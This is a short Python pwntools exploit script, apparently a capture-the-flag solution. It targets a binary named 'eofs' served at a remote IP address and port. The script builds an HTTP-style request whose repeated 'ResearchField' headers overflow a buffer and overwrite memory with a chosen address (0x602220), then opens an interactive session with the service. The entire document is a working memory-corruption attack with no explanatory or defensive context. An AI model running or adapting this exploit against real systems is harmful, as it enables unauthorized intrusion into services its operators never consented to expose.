from pwn import *

# p = process("./eofs")
p = remote("43.254.3.203" ,  10002)
elf = ELF("./eofs")

host_addr = 0x602220

payload = "GET / HTTP/1.1#"
payload += "Host:" + p64(0xDEADBEEF)  + "#" 
payload += "ResearchField:" + "a"*0x60 + "#"
payload += "ResearchField:" + "a"*0X20 + p64(host_addr) + "#"
p.sendline(payload)
p.interactive()
